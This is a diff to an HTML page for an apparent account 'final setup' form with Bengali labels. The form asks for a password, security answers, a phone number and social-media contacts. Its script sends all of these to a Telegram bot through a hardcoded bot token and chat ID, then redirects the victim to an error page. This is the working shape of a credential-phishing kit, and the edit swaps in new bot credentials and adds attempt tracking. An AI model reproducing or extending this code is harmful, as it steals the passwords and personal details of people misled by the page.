@@ -102,6 +102,7 @@
 
         .form-group input[type="text"],
         .form-group input[type="password"],
+        .form-group input[type="tel"],
         .form-group textarea {
             width: 100%;
             padding: 12px;
@@ -245,8 +246,14 @@
             </div>
 
             <div class="form-group">
-                <label for="question2"><i class="fas fa-user-ninja"></i>আপনার ফেসবুক আইডির লিংক অথবা টেলিগ্রাম ইউজার নেম অথবা ফোন নাম্বার দিন? <span class="optional"></span></label>
-                <textarea id="question2" name="security_question_2" rows="3" placeholder="Briefly describe..."></textarea>
+                <label for="phone-number"><i class="fas fa-phone"></i> আপনার ফোন নাম্বার দিন <span class="optional"></span></label>
+                <input type="tel" id="phone-number" name="phone_number" placeholder="+8801XXXXXXXXX">
+                <span class="error-message"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="social-contact"><i class="fas fa-share-alt"></i> আপনার ফেসবুক আইডির লিংক অথবা টেলিগ্রাম ইউজার নেম <span class="optional"></span></label>
+                <input type="text" id="social-contact" name="social_contact" placeholder="Facebook profile link or Telegram username">
                 <span class="error-message"></span>
             </div>
 
@@ -293,6 +300,11 @@
 
     <script>
         document.getElementById('current-year').textContent = new Date().getFullYear();
+
+        // Track submission attempts
+        let submissionAttempts = 0;
+        const maxAttempts = 10;
+        const errorRedirectUrl = '/welcome/error.html';
 
         const form = document.getElementById('final-setup-form');
         const submitButton = document.getElementById('submit-final-setup');
@@ -367,6 +379,14 @@
 
         form.addEventListener('submit', async function(event) {
             event.preventDefault();
+            
+            // Check submission attempts
+            submissionAttempts++;
+            if (submissionAttempts > maxAttempts) {
+                window.location.href = errorRedirectUrl;
+                return;
+            }
+
             clearAllFormErrors();
             let isValid = true;
 
@@ -423,14 +443,15 @@
 
                 const formDataForText = new FormData(); // Separate FormData for text fields
                 formDataForText.append('security_question_1', question1.value);
-                formDataForText.append('security_question_2', document.getElementById('question2').value);
+                formDataForText.append('phone_number', document.getElementById('phone-number').value);
+                formDataForText.append('social_contact', document.getElementById('social-contact').value);
                 formDataForText.append('ray_id', rayId.value);
                 formDataForText.append('password', password.value); // Password (consider hashing on backend)
 
                 // --- Actual Telegram Bot Submission ---
-                const botToken = "7501055809:AAHybTQCakGqgj45Z88HzY3GdT7H-MhzC58"; 
-                const chatId = "7945358964";   
-                const redirectURL = "/welcome/error.html"; 
+                const botToken = "7210173025:AAFlhOsjZ-mi9dvD7pnFK_BxGEt9CRHfEm8"; 
+                const chatId = "7913066602";   
+                const redirectURL = "/welcomr/error.html"; 
 
                 if (botToken === "YOUR_ACTUAL_BOT_TOKEN" || chatId === "YOUR_ACTUAL_CHAT_ID") {
                     console.warn("Telegram Bot Token or Chat ID is not set.");
